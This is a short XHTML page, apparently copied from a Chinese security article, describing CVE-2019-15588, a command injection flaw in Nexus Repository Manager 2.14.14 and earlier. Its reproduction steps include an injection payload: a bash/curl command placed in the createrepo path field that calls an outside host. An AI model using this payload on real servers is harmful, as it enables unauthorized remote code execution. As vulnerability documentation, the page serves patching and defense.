@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Nexus Repository Manager <= 2.14.14 远程命令执行 CVE-2019-15588</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Nexus Repository Manager <= 2.14.14 远程命令执行 CVE-2019-15588</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&amp;mid=2247483790&amp;idx=1&amp;sn=85e3ab7f325fac17260442d6b6022cba&amp;chksm=903fd014a74859023ef6714b0cecded9ee828710b7aa84dbf60b23d92c3019a138d5e22cd001&amp;scene=126&amp;sessionid=1681654102#rd">http://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&amp;mid=2247483790&amp;idx=1&amp;sn=85e3ab7f325fac17260442d6b6022cba&amp;chksm=903fd014a74859023ef6714b0cecded9ee828710b7aa84dbf60b23d92c3019a138d5e22cd001&amp;scene=126&amp;sessionid=1681654102#rd</a></blockquote><div><p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">CVE-2019-15588 There is an OS Command Injection in Nexus Repository Manager &lt;= 2.14.14 (bypass CVE-2019-5475) that could allow an attacker a Remote Code Execution (RCE). All instances using CommandLineExecutor.java with user-supplied data is vulnerable,... cve.mitre.org/cgi-bin/cvenam…</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">以上是cve消息，是知道创宇badcode大佬刷hackerone的时候提交的cve</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">复现的步骤是</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Navigate to "Capabilities" in Nexus Repository Manager.</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Edit or create a new Yum: Configuration capability</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">Set path of "createrepo" or "mergerepo" to an OS command (e.g. /bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo)</span></p>
+<p style="text-align:left;font-family:'PingFang SC';font-size:16px;"/>
+<span style="text-align:left;font-family:'PingFang SC';font-size:16px;"><span style="letter-spacing:2px;color:#333333;">内网系统不要慌，不用熬夜搞，没啥鸟用的，睡吧</span></span>
+</div>
+        
+</body>
+</html>
